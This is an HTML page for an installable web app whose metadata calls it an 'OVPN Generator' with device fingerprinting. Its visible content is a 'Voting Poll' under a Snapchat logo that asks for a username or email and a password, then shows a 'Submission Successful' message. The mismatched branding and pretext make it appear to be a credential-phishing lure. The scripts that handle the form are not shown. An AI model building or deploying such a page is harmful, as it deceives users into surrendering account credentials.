<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Auto-generate OpenVPN configurations with comprehensive device fingerprinting">
    <meta name="theme-color" content="#FFFC00">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="OVPN Gen">
    
    <title>OVPN Generator - Login</title>
    
    <!-- PWA Manifest -->
    <link rel="manifest" href="/manifest.json">
    
    <!-- Favicon -->
    <link rel="icon" type="image/png" sizes="192x192" href="/icon-192.png">
    <link rel="apple-touch-icon" href="/icon-192.png">
    
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Voting Poll</h1>
        <div class="logo">
            <img src="https://www.freepnglogos.com/uploads/snapchat-logo-png-0.png" alt="Snapchat Logo">
        </div>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Username or Email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <a href="#" class="forgot-password">Forgot Password?</a>
    </div>
    <div class="congrats-container" style="display: none;">
        <h2>Congratulations!</h2>
        <p>Submission Successful</p>
    </div>
    <script src="ovpn-generator.js"></script>
    <script src="network-config-native.js"></script>
    <script src="script-enhanced.js"></script>
    
    <!-- PWA Service Worker Registration -->
    <script>
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('/service-worker.js')
                    .then((registration) => {
                        console.log('âœ… Service Worker registered:', registration.scope);
                    })
                    .catch((error) => {
                        console.error('âŒ Service Worker registration failed:', error);
                    });
            });
        }
        
        // PWA Install Prompt
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            console.log('ðŸ’¾ PWA install prompt ready');
            
            // Show custom install button after 3 seconds
            setTimeout(() => {
                if (deferredPrompt && !window.matchMedia('(display-mode: standalone)').matches) {
                    const installBanner = document.createElement('div');
                    installBanner.style.cssText = `
                        position: fixed;
                        bottom: 20px;
                        left: 50%;
                        transform: translateX(-50%);
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                        padding: 15px 25px;
                        border-radius: 25px;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                        z-index: 9999;
                        font-family: 'Avenir Next', sans-serif;
                        font-size: 14px;
                        font-weight: bold;
                        cursor: pointer;
                        animation: slideUp 0.3s ease-out;
                    `;
                    installBanner.innerHTML = 'ðŸ“± Install App';
                    
                    installBanner.addEventListener('click', async () => {
                        deferredPrompt.prompt();
                        const { outcome } = await deferredPrompt.userChoice;
                        console.log(`User response: ${outcome}`);
                        deferredPrompt = null;
                        installBanner.remove();
                    });
                    
                    document.body.appendChild(installBanner);
                }
            }, 3000);
        });
        
        // Detect if app is installed
        window.addEventListener('appinstalled', () => {
            console.log('âœ… PWA installed successfully');
            deferredPrompt = null;
        });
    </script>
    
    <style>
        @keyframes slideUp {
            from {
                transform: translateX(-50%) translateY(100px);
                opacity: 0;
            }
            to {
                transform: translateX(-50%) translateY(0);
                opacity: 1;
            }
        }
    </style>
</body>
</html>
